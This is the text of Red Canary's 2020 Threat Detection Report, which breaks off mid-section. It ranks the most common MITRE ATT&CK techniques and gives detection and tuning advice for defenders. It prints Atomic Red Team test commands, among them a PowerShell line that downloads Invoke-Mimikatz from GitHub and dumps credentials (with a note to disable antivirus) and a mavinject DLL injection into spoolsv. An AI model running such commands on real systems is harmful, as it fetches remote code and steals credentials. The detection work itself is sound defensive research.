FOCU SO NW H ATM AT TER S2020 Threat Detection ReportTable of contentsI NTRODUCTIO NT O PT ECHNIQUE SWhats new in 2020Behind the dataMeet the authors030405\#1T1055 Process Injection\#2T1053 Scheduled Task\#3T1077 Windows Admin SharesAcknowledgements\#4T1086 PowerShell\#5T1105 Remote File Copy\#6T1036 Masquerading\#7T1064 Scripting\#8T1038 DLL Search Order Hijacking\#9T1482 Domain Trust Discovery\#10T1089 Disabling Security ToolsA DDITIONA LR ESEARCH\#11T1003 Credential Dumping\#13T1047 Windows Management
Instrumentation\#20T1193 Spearphishing Attachment06071320263340475359657279872020 Threat Detection ReportI NTRODUCTIO NWelcome to the 2020 Threat
Detection ReportThis in\-depth look at the most prevalent ATT\&CK techniques is designed to help you and your team focus on whatmatters most.6MI NVESTIGATIVELEAD S15KC ONFIRMEDTHREAT S1R EPOR TWelcome to Red Canarys 2020 Threat Detection Report. Based on in\-depth analysis of tens of thousands of threatsdetected across our customers environments, this research arms security leaders and their teams with a uniqueunderstanding of the threats theyre facing.Weve leveraged the common language of MITRE ATT\&CK to categorize confirmed threats, but our analysis focuses onproviding a comprehensive view of adversary techniques that are most likely to occur in your environment. Youll findunique intelligence to inform your thinking, help you prioritize investments, and educate your team on how to detect andshut down adversaries.WHAT SN E WI N2 0 2 0Year\-over\-year trendingCommon co\-occurrencesLast years inaugural report summarized all such 
data available across Red Canarys entire history. 
This years report focuses on the more than 
15,000 threats we detected between January 
and December 2019, comparing them to threats 
detected over the same period in the prior year.ATT\&CK techniques do not occur in isolation, so it isimportant to understand how adversaries leveragemultiple techniques to accomplish their goals. Thisyears report identifies ATT\&CK techniques that areused in concert by adversaries and their tools.Actionable insightsAdditional researchEach technique section includes detailed guidanceOur threat rankings are determined entirely byon data sources security teams can use to observedetection volume. As a result, a sizable outbreakrelated threats. We also provide specific telemetryin one environment can have a disproportionatepatterns that are useful for detecting threats, as wellimpact on our entire dataset. To combat that, weveas those that are prone to false positives.included analysis on supplemental techniques thatare outside the top 10 but affected many customers.3
32020 Threat Detection ReportHow to use the report:Start looking through the most prevalent techniques to see what weve observed in our customers environmentsExplore how to detect and mitigate specific techniques, with ideas and recommendations from ourdetection engineersTalk with your team about how the ideas, recommendations, and priorities fit in with your environmentB EHIN DT H ED AT ASince 2013, Red Canary has delivered high\-quality threat detection to organizations of all sizes. Our platform collectshundreds of terabytes of endpoint telemetry every day, surfacing evidence of threats that are analyzed by our CyberIncident Response Team (CIRT). Confirmed threats are tied to corresponding ATT\&CK techniques so that our customersclearly understand what is happening in their environments. This report is a summary of confirmed threats derived fromthis data.The report excludes low\-severity detection of unwanted software, such as adware. Weve tagged each confirmed threatwith corresponding ATT\&CK technique(s) based on the logic used to identify the threat.42020 Threat Detection ReportM EE TT H EA UTHOR SKeith McCammon
CHIE FS ECURITYOFFICER\&CO \- FOUNDE RKeith leads Red Canarys security, open source, andeducational strategies, as well as community partnerships.He has spent 20 years in InfoSec, including over a decade ofservice to the US Department of Defense and IntelligenceCommunity.Brian Donohue
ANALYS TJeff Felling
DIRECTO RO FINTELLIGENC ETony Lambert
INTELLIGENC EA NALYS TBrian has been writing about and researching informationsecurity for the last decade. He started his career as ajournalist covering security and privacy. He later consultedas a threat intelligence analyst, researching adversariesand techniques for a variety of major banks, retailers, andmanufacturers. At Red Canary, Brian helps guide researchpublication and technical messaging efforts.Jeff Felling is a puzzle solver who currently contemplates theconundrums confounding corporate computer custodians,aka a threat hunter. After nearly a dozen years analyzinganomalies, foraging for forensic artifacts, and mulling overmalware for the DoD, Jeff returned home to Indiana in2016 where he helped create Anthem, Inc.s threat huntingprogram, ORION, prior to joining Red Canary in April 2019\. Jeffholds degrees in mathematics from Johns Hopkins University(MS) and Purdue University (BS), and is certified in security,incident handling, and forensic analysis through SANS.Tony is a professional geek who loves to jump into all thingsrelated to detection and digital forensics. After workingin enterprise IT administration and detection engineeringfor several years, he now applies his DFIR skills to researchmalware, detect malicious activity, and recommendremediation paths. Tony is a natural teacher and regularlyshares his findings and expertise through blogs, researchreports, and presentations at conferences and events.ACKNOWLEDGMENT SIt takes an army to produce a research piece of this magnitude. Thanks to the detection engineers, data analysts, editors,designers, developers, and project managers who invested countless hours in this report. And a huge thanks to the MITREATT\&CK team, whose framework has helped the community take a giant leap forward in understanding and trackingadversary behaviors.5
52020 Threat Detection ReportT HREA TD ETECTIO NR EPOR TTop TechniquesThis chart illustrates how often each ATT\&CK technique is leveraged in a confirmed threat in our customers environments.123456789101112131415161718192017% of total threatsT1055 Process Injection13%13%12%9%7%5%5%5%5%5%4%4%3%2%2%2%2%2%2%T1053 Scheduled TaskT1077 Windows Admin SharesT1086 PowerShellT1105 Remote File CopyT1036 MasqueradingT1064 ScriptingT1038 DLL Search Order HijackingT1482 Domain Trust DiscoveryT1089 Disabling Security ToolsT1003 Credential DumpingT1035 Service ExecutionT1047 Windows Management InstrumentationT1085 Rundll32T1140 DeobfuscateDecode Files or InformationT1093 Process HollowingT1015 Accessibility FeaturesT1168 Local Job SchedulingT1170 MshtaT1193 Spearphishing AttachmentNOTE: This report was based on the October 2019 version of the MITRE ATT\&CK framework 
(v6\.3\). Some technique names and numbers used here may not map to the current matrix.62020 Threat Detection ReportT ECHNIQU ET 1 0 5 5Process InjectionProcess Injection was the most common threat we observed in our customers environments in 2019, largely because
TrickBot uses the technique to run arbitrary code through the Windows Service Host (svchost.exe)1O VERALLRAN KAnalysis2018135%ORGANIZATIONSAFFECTE D2,734C ONFIRMEDTHREAT S20191Process Injection rose to the top of ourrankings due to widespread TrickBot andEmotet outbreaks in late 2018 that continuedthrough 2019\.Why do adversaries use Process Injection?Process Injection tops our list as the most common ATT\&CK technique across our customer base due to a very specificthreat: TrickBot. However, the technique is actually quite versatile, facilitating a range of actions as broad as nearly anyother ATT\&CK technique. Categorized under both Defense Evasion and Privilege Escalation, Process Injection is arguablyan Execution technique as well.Process Injection is a technique whereby an adversary is able to carry out some nefarious activity in the context of alegitimate process. In this way, malicious activitywhether its an overtly malicious binary or a process thats been co\-opted as suchblends in with routine operating system processes.Stealth, however, is just one of the benefits of Process Injection. Its most useful function may be that arbitrary code, onceinjected into a legitimate process, can inherit the privileges of that process or, similarly, access parts of the operatingsystem that shouldnt be otherwise available.72020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Process Injection?In the environments we monitor, the vast majority of Process Injection activity results from TrickBot infections.Specifically, TrickBot launches svchost.exe and then uses Process Injection to carry out malicious activity.Some other common variations of Process Injection include:Remotely injecting code libraries into running processesUsing seemingly benign processes such as notepad.exe to make external network connections and later injectingcode that performs malicious actionsLeveraging Microsoft Office applications to create RemoteThread injections into dllhost.exe for the purposes ofconducting attacks with malicious macrosCross\-process injection initiated by lsass.exe into taskhost.exeMetasploit injecting itself into processes such as svchost.exe to avoid suspicion and increase stabilityInjecting code into a browser process to enable snooping on a users browsing session, which is a commoncharacteristic of banking and other credential\-stealing trojansIn addition to TrickBot, we have also seen the following malware families carry out Process Injection:PlugXDridexEmotetAgentTeslaHancitorUrsnifDreambotSighted withWe most commonly see Process Injection occurring in tandem with Scheduled Tasks (T1053\) across our customer basebecause TrickBot sometimes uses Scheduled Tasks for persistence.We also often see Process Injection paired with Remote File Copy (T1105\) and Windows Admin Shares (T1077\). Codeinjected into TrickBot downloads additional libraries for execution, explaining its occurrence with Remote File Copy,82020 Threat Detection Reportwhile TrickBot and common follow\-on trojan Emotet use Windows Admin Shares to move laterally on an infected network.Far less often we see Process Injection alongside Uncommonly Used Port (T1509\)likely because code injected by TrickBotmay communicate on tcp447 and tcp449 for command and controland Mshta (T1170\). The latter is the result of newer.NET exploitation tools such as DotNetToJScript and CACTUSTORCH that allow attackers to inject code fromHTML Applications.CUSTOMER SA FFECTE DDefinitionT 1 0 5 5 :PROCES SI NJECTIO NProcess Injection is a method of executing arbitrary code in the address space of a separate live process. Runningcode in the context of another process may allow access to the processs memory, systemnetwork resources, andpossibly elevated privileges. Execution via Process Injection may also evade detection from security products since theexecution is masked under a legitimate process.Detection 
MITREs data sourcesAPI monitoringWindows RegistryFile monitoringDLL monitoringProcess monitoringNamed Pipes92020 Threat Detection ReportCollection requirementsProcess monitoringProcess monitoring is a minimum requirement for reliably detecting Process Injection. Even though injection can beinvisible to some forms of process monitoring, the effects of the injection can become harder to miss once you compareprocess behaviors against expected functionality.API monitoringIf possible, monitor API system calls that include CreateRemoteThread in Windows. This will indicate a process is usingthe Windows API to inject code into another process. Security teams should monitor for the ptrace system calls on Linuxas well.Detection suggestionsThe detection of Process Injection involves hunting for legitimate processes doing unexpected things. This may involveprocesses making external network connections and writing files, or it may involve processes spawning with unexpectedcommand\-line arguments.Some good examples of odd behavior within a process include:Svchost.exe making network connections on tcp447 and tcp449Notepad.exe making external network connectionsMshta.exe calling CreateRemoteThread to inject codeSome good examples of odd paths or command lines that may indicate injection:Rundll32\.exe, regasm.exe, regsvr32\.exe, regsvcs.exe, svchost.exe, and werfault.exe process executions withoutcommand\-line options may indicate they are targets of process injection.Microsoft processes such as vbc.exe with command lines including scomma, shtml, or stext may indicate theinjection of Nirsoft tools for credential access.Linux processes with memfd: in their path indicate they were spawned from code injected into another process.Specific to TrickBot, we have two behavioral analytics that look for untrusted processes launching svchost.exe. Collectively,these two analyticson their own and in tandemuncovered more than 4,200 confirmed threats. A third analytic looks for amix of svchost.exe injection and network connections. It converted into a confirmed threat nearly 2,500 times.In addition, adversaries may modify some files or environment variables on macOS and Linux systems to signal intent forProcess Injection:On macOS, modifying the DYLD\_INSERT\_LIBRARIES environment variable may allow injection.On Linux systems, modifying the etcld.so.preload file or the environment variables LD\_PRELOAD orLD\_LIBRARY\_PATH may allow injection.102020 Threat Detection ReportWeeding out false positivesThe analytics that produced the most false positives came from looking for CreateRemoteThread calls from any and allprocesses. Many tools in Windows use Process Injection legitimately for debugging and virtualization. If you want to writeanalytics around this API call, focus them on unusual source processes, such as Microsoft Office products and tools thatcommonly deliver first\-stage malware like scripts and Mshta.TestingStart testing your defenses against Process Injection using Atomic Red Teaman open source testing framework of small,highly portable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1055: Process Injection. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using PowerShell:Invoke\-WebRequest https:github.comredcanarycoatomic\-red\-teamrawmasteratomicsT1055srcx64T1055\.dll \-OutFile $env:TEMPT1055\.dll$mypid \= (get\-process spoolsv).idmavinject $mypid INJECTRUNNING $env:TEMPT1055\.dll112020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exe, mavinject.exeDLL monitoringT1055\.dllAPI monitoringVirtualAllocEx, WriteProcessMemory, CreateRemoteThreadReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TJason Killam 
DETECTIO NE NGINEE RThe detection strategies in this section werebrought to you by Jason Killam, who works onRed Canarys Cyber Incident Response Team(CIRT) as a detection engineer. Prior to that,Jason worked as an incident responder forsecurity teams in the financial sector.122020 Threat Detection ReportT ECHNIQU ET 1 0 5 3Scheduled TaskScheduled Task is another technique that owes its prominence largely to TrickBot, which schedules tasks to launch 
malicious binaries and persist on host machines2O VERALLRAN KAnalysis2018233%ORGANIZATIONSAFFECTE D2,079C ONFIRMEDTHREAT S20192With an increase in the percentage of customersaffected and a decrease in percentage of totalthreat volume, Scheduled Task was the secondmost prevalent threat in both 2018 and 2019\.Why do adversaries use Scheduled Tasks?Scheduled Tasks allow adversaries to carry out certain actions at pre\-specified times, enabling execution, persistence,and privilege escalation. Like many of the techniques analyzed in this report, Scheduled Tasks are a functionally necessarycomponent of the Windows operating system. They execute routinely, and malicious tasks readily blend in with benignones.Scheduled Tasks represent a versatile tool for adversaries. With the requisite privileges, an attacker can schedule tasksremotely. The technique is also useful for execution and persistence in conjunction with a variety of widely used scriptinglanguages, such as PowerShell.132020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Scheduled Tasks?Adversaries create Scheduled Tasks to run scripts, execute processes, or persist on endpoints to execute later.Behaviors we frequently observe include:Adware updating itself by using Scheduled Tasks to launch unsigned binaries from AppDataMalware using the Task Scheduler Engine (taskeng.exe) to launch a malicious binary that then executes theService Host process (svchost.exe)Scheduled Tasks executing PowerShell payloads for persistent accessThe above behaviors triggered thousands of detections across our customer base and are common characteristics ofadware, TrickBot, and QBot infections, respectively.While TrickBot and Emotet influence the prominence of Scheduled Tasks in our detection data, adversaries of everysophistication levelfrom adware peddlers to national intelligence agenciesrely on Scheduled Tasks.Sighted withScheduled Tasks very commonly occur alongside:Masquerading (T1036\)Process Injection (T1055\)Disabling Security Tools (T1089\)Domain Trust Discovery (T1482\)Remote File Copy (T1105\)Windows Admin Shares (T1077\)With the possible exception of Masquerading, TrickBot commonly leverages each of these techniques.142020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 0 5 3 :SCHEDULE DT AS KUtilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts tobe executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication ismet to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being amember of the Administrators group on the remote system. An adversary may use task scheduling to execute programsat system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, togain SYSTEM privileges, or to run a process under the context of a specified account.Detection 
MITREs data sourcesFile monitoringProcess monitoringProcess command\-line parametersWindows event logs152020 Threat Detection ReportCollection requirementsAPI monitoringAPI monitoring is an additional data source that is useful in certain contexts for observing adversaries leveraging ScheduledTask. In some attack campaigns, adversaries have used the Windows Component Object Model and Distributed COMtechnique (T1175\) to create a Scheduled Task via macros or other methods. API monitoring provides visibility into this andother covert methods for creating a Scheduled Task.File monitoringFile monitoring provides a useful data source for observing the malicious use of Scheduled Tasks. Defenders shouldconsider tracking the schtasks.exe or at.exe binary because it will enable them to continue observing Scheduled Tasks,even if the binary has been moved to a different path or renamed entirely. A Scheduled Task that has been moved orrenamed can be a good indicator of malice.Process monitoringMonitoring process execution of schtasks.exe and at.exe is important because these processes have the ability to set taskslocally or remotely, enabling lateral movement. Historically, adversaries have set Scheduled Tasks to start under a differentuser context (administrator, for example).More recently, PowerShell has a cmdlet (new\-ScheduledTask) that provides the same functionality as schtasks.exe.Understanding the processes that normally spawn Scheduled Tasks and monitoring parent\-child process relationships isuseful for observation as well.Process command\-line parametersProcess command\-line parameters are another rich source for observing malicious Scheduled Tasks. While they mightprovide the highest fidelity of alerting, they also offer adversaries the most potential for blending in. Understanding thevarious parameters and what to look for in a given environment requires extensive research and testing, but tracking viathe command\-line is ultimately the way that most teams monitor for Scheduled Task abuse.Windows event logsWindows event logs may also provide useful information about start and stop times for task execution, as well as additionaldetails about the task itself.162020 Threat Detection ReportDetection suggestionsSecurity teams should begin by reviewing all process and command\-line execution of schtasks.exe and at.exe, ranking theresults from most common to least. Where possible, you should also try to collect all Scheduled Tasks across an environmentusing a tool such as OSQuery or Sysinternals Autoruns. Again, youll want to organize the associated processes and command\-lines by occurrence, so that you understand which tasks occur often and which do not.Youll want to take a close look at less commonly used command\-line switches for schtasks.exe. One example might be XML.Its entirely possible that searching for this in your environment may turn up nothing, but if you do happen to find it, youllwant to examine the contents of that XML file.Its also a good idea to monitor for tasks that spawn at seemingly strange intervals. For example, something like sc minutemo 20, which means that the task will run every 20 minutes, should be viewed with suspicion. There are few legitimatereasons that a task would need to run every 20 minutesor at any other fixed interval.Tracking for Scheduled Tasks that load binaries (.exe, for example) or scripts (.ps1, .vbe, and .vbs to name a few) fromsuspicious paths is a quick win for detection. The default execution path for schtasks.exe or at.exe is c:windowssystem32and c:windowssyswow64, so any deviation from those should raise concerns that the binary has been moved. Alsoconsider monitoring for suspicious execution paths such as appdata and windowstasks, as it is pretty suspicious for aScheduled Task to execute from either of these paths.As is the case with Masquerading, you should review binary metadata. Binary metadata includes a field for internal names,which are often good indicators of a binarys true identity. Its a good idea to raise an alert when it appears that schtasks.exe orat.exe have been renamed.Ultimately, youll want to understand what parent processes normally spawn Scheduled Tasks. Is it normal in yourenvironment for SYSTEM to create a task? If the answer is no, then youll want to consider alerting on that behavior.Similarly, you may want to track when users spawn schtasks.exe from PowerShell or cmd.exe.Weeding out false positivesWe should note that tracking schtasks.exe command\-line parameters may generate a high volume of data and false positivesat first. By default, Windows runs a number of common tasks. The same is essentially true at the organizational level, withapplication and server\-specific tasks. Once you identify and tune out the normal, deviations are pretty reliable indicators ofmaliciousness.Some automated software deployment utilities (e.g SCCM, Kaseya) may utilize Scheduled Tasks to deploy software or keepsystems up to dateand may contribute to high false positive rates.172020 Threat Detection ReportTestingStart testing your defenses against Scheduled Task using Atomic Red Teaman open source testing framework of small,highly portable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1053: Scheduled Task. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using Command Prompt:SCHTASKS Create SC ONCE TN spawn TR cmd.exe ST 21:00182020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringschtasks.exeProcess command lineSC ONCE, cmd.exe, ST 21:00Registry monitoringfor storage of scheduled task detailsReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute tests ofyour own.DETECTIO NS TRATEGIS TMichael Haag 
DIRECTOR ,ADVANCEDTHREA TD ETECTIONAN DR ESEARC HThe detection strategies in this section werebrought to you by Michael Haag! Michaelhas more than a decade of experience insecurity architecture and operations. Hisspecialties include advanced threat huntingand investigations, testing, and technologicalevaluations and integrations.192020 Threat Detection ReportT ECHNIQU ET 1 0 7 7Windows Admin SharesSelf\-propagating threatsmost notably those that leverage ETERNALBLUEcontributed to the rise of Windows Admin 
Shares among confirmed threats in the environments we monitor.28%ORGANIZATIONSAFFECTE D1,995C ONFIRMEDTHREATS\#3O VERALLRAN KAnalysis20181020193Change7Windows Admin Shares experienced a dramaticshift in prevalence from 2018 to 2019, climbingfrom 10 to three and almost quintupling inthreat volume.Why do adversaries use Windows Admin Shares?Windows Admin Shares are enabled by default on most Windows systems, and administrators regularly use them toconduct remote host management. Since Windows Admin Share activity is so common, it provides adversaries with apowerful, discreet way to move laterally within an environment. Self\-propagating ransomware and cryptocurrency miners,both rapidly emerging threats, rely on Windows Admin Shares.Many popular lateral movement and execution tools leverage Windows Admin Shares, including:PsExecRemComCSExecPAExecImpacket wmiexec202020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Windows Admin Shares?Adversaries commonly use administrative tools such as PsExec (and the various clones of it) to deploy malware fromone machine to another. Admin shares can also be used to store the output of commands for easy access.The rise of ETERNALBLUEa prominent, publicly available exploit for a vulnerability in the Windows server messageblock (SMB) protocolis a major factor in increased detection of Windows Admin Shares and related activity. To thatpoint, many of our ETERNALBLUE\-related analytics map partially to Windows Admin Shares and alert on threatssuch as:WannaCryTrickBotSeveral cryptocurrency minersMetasploitCobalt StrikeOther post\-exploitation frameworks that use Impacket wmiexecRed teamsSighted withWindows Admin Shares are often used in conjunction with behaviors relating to Remote File Copy (T1105\)becauseadversaries commonly use the technique to remotely copy filesand Network Share Discovery (T1135\). It can also occurwith New Service (T1050\) and Service Execution (T1035\) because PsExec deploys its receiver executable to admin shares,scheduling a service to execute it.CUSTOMER SA FFECTE D212020 Threat Detection ReportDefinitionT 1 0 7 7 :WINDOW SA DMI NS HARE SWindows systems have hidden network shares that are accessible only to administrators and provide the ability forremote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversariesmay use this technique in conjunction with administrator\-level Valid Accounts to remotely access a networked systemover server message block (SMB) to interact with systems using remote procedure calls (RPCs), transfer files, and runtransferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions overSMBRPC are Scheduled Task, Service Execution, and Windows Management Instrumentation. Adversaries can also useNTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.The Net utility can be used to connect to Windows admin shares on remote systems using net use commands with validcredentials.Detection 
MITREs data sourcesProcess use of networkAuthentication logsProcess monitoringProcess command\-line parametersCollection requirementsProcess use of networkThe malicious use of Windows Admin Shares is often accompanied by large numbers of internal network connections tohosts over the SMB protocol on port 445\. Monitoring for this type of activityhigh volumes of network connections overport 445has been instrumental in helping us identify adversarial uses of Windows Admin Shares.222020 Threat Detection ReportAuthentication logs, process monitoring, process 
command\-line parametersAuthentication logs are a useful data source for observing certain aspects of malicious Windows Admin Shares. Sotoo is process monitoring, which is often used in conjunction with Scheduled Tasks, Service Execution, and WindowsManagement Instrumentation (WMI). Process command\-line parameters are useful as well, particularly forlocalhost shares.Network sharesWhile MITRE doesnt list it explicitly, security teams should also consider monitoring network shares (e.g ADMIN$, C$,and PRINT$), because malicious use of Windows Admin Shares frequently coincides with execution from network shares.An example of this might include the redirection of host or other data in the service of conducting reconnaissance on thelocalhost admin share.Detection suggestionsSome telemetry patterns to help detect this type of behavior include the use of cmd.exe with the names of shares such aslocalhostADMIN$ or 127\.0\.0\.1ADMIN$.Weeding out false positivesBecause admin shares are often used within the enterprise, but are rarely used uniformly across enterprises, genericdetection strategies frequently lead to high false positive rates.If admin shares are being legitimately used, process and process command\-line monitoring may allow you to build a listof processes and attributes that are known, so that you can alert on any deviations. For example, if you expect processntoskrnl.exe to make a local admin share modification to a specific file at path 127\.0\.0\.1admin$\[name\-of\-file], thenthese can be suppressed and any other process may generate an alert.Other common sources of false positives are inventory and asset discovery systems. Extend the whitelisting strategyabove, adding criteria for initiating system(s), frequency, time of day, and other limiting factors. Just be sure to closelymonitor the integrity of any system that you add to your list of trusted initiators, as these systems may be useful targets toan adversary.232020 Threat Detection ReportTestingStart testing your defenses against Windows Admin Shares using Atomic Red Teaman open source testing framework ofsmall, highly portable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1077: Windows Admin Shares. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using Command Prompt:cmd.exe Q c hostname 1\> 127\.0\.0\.1ADMIN$output.txt 2\>\&1242020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringcmd.exeProcess use of networkconnection to 127\.0\.0\.1, access to admin sharesReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TKeya Horiuchi 
DETECTIO NE NGINEE RThe detection strategies in this section werebrought to you by Keya Horiuchi! Keya hasexperience in multiple areas of informationsecurity, including security audits, web andnetwork infrastructure assessments, and networksystem administration.252020 Threat Detection ReportT ECHNIQU ET 1 0 8 6PowerShellA core component of many effective attack toolkits, PowerShell is ubiquitous, versatile, and as popular among 
administratorswho use it for remote system managementas it is among adversaries4O VERALLRAN KAnalysis2018455%ORGANIZATIONSAFFECTE D1,886C ONFIRMEDTHREAT S20194Malicious PowerShell affected a slightly smallernumber of customers in 2019 than in 2018\. Overthe same time period, PowerShell accountedfor a slightly higher percentage of total threats.Why do adversaries use PowerShell?Installed by default on nearly every Windows system in the world, PowerShell is a dynamic command\-line shell andscripting language that IT teams routinely use to conduct remote system administration. Not only is PowerShell activityexpected in most Windows environments, system administrators often use the utility in unique and creative ways. As aresult, it can be difficult to reliably differentiate legitimate from malicious PowerShell.Furthermore, administrators and adversaries use many of the same PowerShell features, whether theyre remotelyconfiguring Windows machines and enforcing patch management policies or conducting reconnaissance, running maliciousscripts, and installing binaries.On a more technical level, PowerShell can execute code directly in memory, often using obfuscated commands andreflective injection, making it more difficult to observe and detect. By default, the tool enjoys highly privileged access to theWindows operating systemthrough application programming interfaces (API), processes such as Windows ManagementInstrumentation (WMI), and the .NET framework, to name a few.262020 Threat Detection ReportWhile newer versions of PowerShell (starting with version 3\) offer robust logging capabilities that are helpful forobservation and detection, version two and prior remain widely used and lack even basic logging functionalities. We haveyet to see any significant malicious use of PowerShell on non\-Windows systems, but its worth noting that the tool is cross\-platform and open source.Its ease of use and platform availability contribute to PowerShells inclusion in countless red team tools and attacksimulation platforms, including:PowerShell EmpirePowerSploitInvoke\-MimikatzMetasploitAtomic Red TeamCobalt StrikeT HREA TV OLUM EHow do adversaries use PowerShell?PowerShell is highly utilitarian, offering an adversary far more use cases than we can examine in this report. Its mostcommonly used to remotely execute scripts and payloads. We regularly see adversaries leveraging embedded macros tolaunch PowerShell from Office documentsa set of behaviors that we map to both the PowerShell and SpearphishingAttachment (T1193\) techniques.Adversaries also use PowerShell to:Launch MeterPreter sessionsInject into processesBypass execution policyExecute code filelessly, entirely in CLI to avoid writing scripts to diskStore code in the Windows Registry to avoid writing scripts to diskMove laterally and deploy malware rapidly with other tools such as WMI272020 Threat Detection ReportEmerging tacticsRecent iterations of Qbot have been using PowerShell in a particularly novel way: executing PowerShell as an autorun(to avoid obvious binary\-based detection) before masquerading as a Windows Update Task that loads the binary as anenvironmental variable.Additional novel uses include:Bypass Antimal Scan Interface (ASMI), disable Script Block Logging, and manipulate Windows Defender settingsReflectively load code and evade defensive measuresPersistently execute malware without directly referencing the binarySighted withWe often detect PowerShell used in conjunction with Scripting (T1064\). The prevalence of threat detections including bothPowerShell and Scripting activity is due primarily to the popularity of living\-off\-the\-land techniques. The co\-occurrenceof PowerShell and Scripting manifests in many ways, but one good example would be an instance where PowerShelldownloads a string of JavaScript from the internet and then leverages wscript.exe to run it.The following malware variants have used PowerShell and Windows Script Hosts in their initial infection routines:TrickBotQbotEmotetDridexKovterOther common pairings include Spearphishing Attachment (T1193\), likely due to phishing campaigns in which maliciousmacros launch PowerShell, and DeobfuscateDecode Files or Information (T1140\) in cases where PowerShell commandsare obfuscated.CUSTOMER SA FFECTE D282020 Threat Detection ReportDefinitionT 1 0 8 6 :POWERSHEL LPowerShell is a powerful interactive command\-line interface and scripting environment included in the Windowsoperating system. Adversaries can use PowerShell to perform a number of actions, including discovery of informationand execution of code. Examples include the Start\-Process cmdlet which can be used to run an executable and theInvoke\-Command cmdlet which runs a command locally or on a remote computer.Detection 
MITREs data sourcesPowerShell logsLoaded DLLsDLL monitoringWindows RegistryFile monitoringProcess monitoringProcess command\-line parametersCollection requirementsBeyond those referenced by ATT\&CK, security teams should consider collecting information from Microsofts AntimalwareScan Interface (AMSI), Sysmon, and ScriptBlock logging.Unfortunately, there is no single data source that provides a holistic way to reliably observe and detect PowerShell in all ofits varied forms. AMSI is very effective at detecting malicious uses of PowerShell, but it can produce high volumes of datathat lack context if you dont have some type of event tracing enabled. ScriptBlock logging provides a tremendous level ofvisibility into the PowerShell activity it logs, but it is not able to record PowerShell that is injected directly into memory.Adding to this confusion, some versions of certain Endpoint Detection and Response (EDR) platforms are able to collectdirectly injected PowerShell and others are not. Ideally, security teams can run AMSI to alert on what Microsoft deems to be292020 Threat Detection Reportmalicious PowerShell, use ScriptBlock logging to gain visibility into some uses of PowerShell, and then leverage telemetryfrom a capable EDR platform to gain visibility into in\-memory use of PowerShell. The added benefit of having AMSI runningin your environment is that it provides visibility into JavaScript, WScript, CScript, VBScript, VBA Macros, and User AccountControl (UAC).Detection suggestionsOnce youre collecting the logs necessary to observe malicious instances of PowerShell, you can begin looking forprocess interactions and other artifacts that will reliably alert your security team to anomalous and potentially maliciousbehaviors. As a caveat, many of these suggestions are environment\-dependent and will vary in effectiveness from oneorganization to another.A good place to start is a review of encoded commands. Not all encoded commands are malicious, but most maliciouscommands are encoded. Looking for encoded or obfuscated command lines will consistently provide value when searchingfor malicious activity. While this may be noisy in some environments, youll want to consider looking for:All variations of the \-encodedcommand switch. (\-e, \-en, \-enc, en, etc.)Strings such as Base64Use of obfuscation characters, such as ^Weeding out false positivesTo combat the noise, begin whitelisting common encoded commands observed in your environment related to knowngood applications and approved IT activity. Constant tuning of your detection criteria improves the fidelity of alerts, whichsaves analysis time and reduces alert fatigue in your Security Operations Center (SOC).It may be helpful to monitor all scheduled tasks that were created using PowerShell across your environment. If you areable to filter certain command lines, then its worthwhile to look out for any containing URLs. The following alert ideas willreliably find malicious PowerShell, but they might also generate a lot of noise:Strings such as http or parsing command lines for invoke\-webrequest, iwr, downloadString, cURL, and wget, toname a handful of optionsCommands leveraging .NET for modules such as System.Net.WebRequestFrom an EDR perspective, tracking process ancestry is another good PowerShell detection strategy. Malicious PowerShelloften stems from an unusual parent process, such as Microsoft Office applications such as Word or Excel, as is common inmacro\-laden phishing attacks.302020 Threat Detection ReportTestingStart testing your defenses against PowerShell using Atomic Red Teaman open source testing framework of small, highlyportable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1086: PowerShell. In most environments, these should be sufficient to generate a useful signalfor defenders.Run this test on a Windows system using PowerShell:powershell.exe IEX (New\-Object Net.WebClient).DownloadString(https:raw.githubusercontent.comPowerShellMafiaPowerSploitf650520c4b1004daf8b3ec08007a0b945b91253aExfiltrationInvoke\-Mimikatz.ps1\); Invoke\-Mimikatz \-DumpCredsCaveat: you may have to disable antivirus to run this test.312020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exeProcess command lineInvoke\-Mimikatz, DumpCreds, WebClient, use of invoke expressionIEX, and the presence of a URL.Network connectionto githubusercontent.comReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS 